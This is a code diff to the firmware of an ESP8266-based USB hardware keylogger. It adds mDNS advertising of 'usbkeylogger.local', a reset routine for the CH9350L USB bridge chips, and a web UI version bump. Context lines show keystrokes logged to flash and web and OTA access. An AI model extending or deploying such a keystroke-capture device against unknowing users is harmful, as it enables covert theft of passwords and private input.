@@ -21,6 +21,7 @@
 #include <ESPAsyncWebServer.h>
 #include <ESPAsyncDNSServer.h>
 #include <ESP8266HTTPClient.h>
+#include <ESP8266mDNS.h>
 #include <Updater.h>
 #include <ArduinoOTA.h>
 #include <bearssl/bearssl.h>
@@ -31,6 +32,11 @@
 // Slot path buffer: "/keyLog.99.txt\0" = 16 chars; 20 gives headroom if
 // LOG_SLOT_COUNT is ever increased past 9 slots.
 #define SLOT_PATH_SIZE 20
+
+// ESP-07S GPIO0 is wired to both CH9350L RST pins.  LOW = reset/config mode,
+// HIGH = normal operation.  Keep the pin high after the boot pulse so the
+// CH9350L bridges run normally (see USBKeylogger_Hardware_Report.md §3.2/§4.4).
+#define CH9350_RST_PIN 0
 
 // =======Config=======
 const char* Version = "1.3.1";
@@ -175,6 +181,7 @@ bool hidReportLooksValid(const uint8_t* report);
 String templateProcessor(const String& var);
 void runOpenWifiProbe();
 void startArduinoOTA();
+void resetCH9350();
 
 static inline bool isLogAscii(uint8_t b) {
   return b == '\n' || b == '\r' || b == '\t' || (b >= 0x20 && b <= 0x7E);
@@ -439,6 +446,11 @@ void setup() {
   Serial.setRxBufferSize(512);
   Serial.begin(115200);
   Serial.setDebugOutput(false);
+
+  // Release / hold CH9350L in normal running mode.  The hardware ties RST to
+  // GPIO0, so a short LOW pulse resets both HID→UART and UART→HID chips.
+  resetCH9350();
+
   // Enable 8-second watchdog; loop() must not block longer than this.
   ESP.wdtEnable(WDTO_8S);
   if (!LittleFS.begin()) {
@@ -554,6 +566,11 @@ void setup() {
   startWiFi();
   startWebInterface();
   startArduinoOTA();
+
+  // Advertise usbkeylogger.local for browser access and ArduinoOTA discovery.
+  if (MDNS.begin("usbkeylogger")) {
+    MDNS.addService("http", "tcp", 80);
+  }
 }
 
 void loop() {
@@ -581,6 +598,9 @@ void loop() {
 
   // Handle ArduinoOTA (IDE / network firmware update)
   ArduinoOTA.handle();
+
+  // Maintain mDNS responder for usbkeylogger.local
+  MDNS.update();
 
   // Periodic flush so recent keys survive sudden power loss
   if (logDirty && millis() - lastFlushTime >= flushInterval) {
@@ -1567,7 +1587,7 @@ void sendCaptivePortalLanding(AsyncWebServerRequest* request) {
 }
 
 void printPageStart(Print* response, const char* titleKey) {
-  response->print("<!DOCTYPE html><html><head><meta charset='utf-8'><script src='/common.js?v=ui10'></script></head><body><main class='page'><header class='topbar'><div class='title-line'><div><a href='https://github.com/Push3AX/USBKeylogger' style='text-decoration:none;color:inherit'><p class='kicker'>ANT Project</p><h1 data-i18n='");
+  response->print("<!DOCTYPE html><html><head><meta charset='utf-8'><script src='/common.js?v=ui11'></script></head><body><main class='page'><header class='topbar'><div class='title-line'><div><a href='https://github.com/Push3AX/USBKeylogger' style='text-decoration:none;color:inherit'><p class='kicker'>ANT Project</p><h1 data-i18n='");
   response->print(titleKey);
   response->print("'></h1></a></div><span class='badge'>v");
   response->print(Version);
@@ -1625,6 +1645,17 @@ void startWiFi(){
 }
 
 // ── ArduinoOTA (IDE / network firmware update) ────────────────────────────
+// Pulse GPIO0 LOW to reset both CH9350L chips, then leave it HIGH.
+void resetCH9350() {
+  pinMode(CH9350_RST_PIN, OUTPUT);
+  digitalWrite(CH9350_RST_PIN, HIGH);
+  delay(20);
+  digitalWrite(CH9350_RST_PIN, LOW);
+  delay(20);           // >= 10 ms per datasheet / hardware report
+  digitalWrite(CH9350_RST_PIN, HIGH);
+  delay(200);          // wait for CH9350L to come back up
+}
+
 void startArduinoOTA() {
   ArduinoOTA.setHostname("USBKeylogger");
   if (cfg.ota_password.length() > 0) {
